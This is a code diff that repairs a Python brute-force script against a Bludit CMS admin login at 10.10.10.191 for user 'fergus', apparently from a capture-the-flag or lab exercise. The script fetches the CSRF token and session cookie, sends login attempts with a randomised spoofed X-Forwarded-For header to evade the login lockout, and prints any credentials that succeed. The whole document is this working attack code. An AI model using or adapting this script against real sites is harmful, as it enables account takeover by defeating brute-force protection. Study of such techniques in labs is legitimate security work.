@@ -1,23 +1,26 @@
 import requests
 import re
 import random
-HOST ="10.10.10.191"
-USER ="fergus"
-PROXY ={'http':'127.0.0.1:8080'}
+HOST = "10.10.10.191"
+USER = "fergus"
+PROXY = {'http':'127.0.0.1:8080'}
 
 def init_session():
-    r.requests.get(f"http://{HOST}/admin/")
-    csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-f0-9])"', r.text)
-    csrf=csrf.group[1]
-    cookie=r.cookies.get('BLUDIT.KEY')
-    return csrf, cookies
+    r= requests.get('http://10.10.10.191/admin/')
+    csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-f0-9]*)"', r.text)
+    csrf=csrf.group(1)
+    cookie=r.cookies.get('BLUDIT-KEY')
+  
+    return csrf, cookie
+
+
 
 def login(user,password):
-    csrf,cookie =init_session()
+    csrf,cookie = init_session()
     headers = {
-            'X-Forwarded-For' : f:"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
+            'X-Forwarded-For' : f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
     
-              }
+          }
     data={
         'tokenCSRF':csrf,
         'username':user,
@@ -27,14 +30,15 @@ def login(user,password):
     cookies = {
         'BLUDIT-KEY':cookie
     }
-    r=requests.post(f'http://{HOST}/admin/login',data=data, cookies=cookies,headers=headers, allow_redirects=False)
+    r = requests.post('http://10.10.10.191/admin/login',data=data, cookies=cookies,headers=headers, allow_redirects=False)
     if r.status_code != 200:
-        print(f"{USER}:{password}")
-        return True
-    elif "password incorrect" in r:
+    	print(f"{USER}:{password}")
+    	return True
+    elif "password incorrect" in r.text:
         return False
-    elif "has been blocked" in r:
-        print("Blocked")
+    elif "has been blocked" in r.text:
+       print("Blocked")
+       return False
     else:
         print(f"{USER}:{password}")
         return True
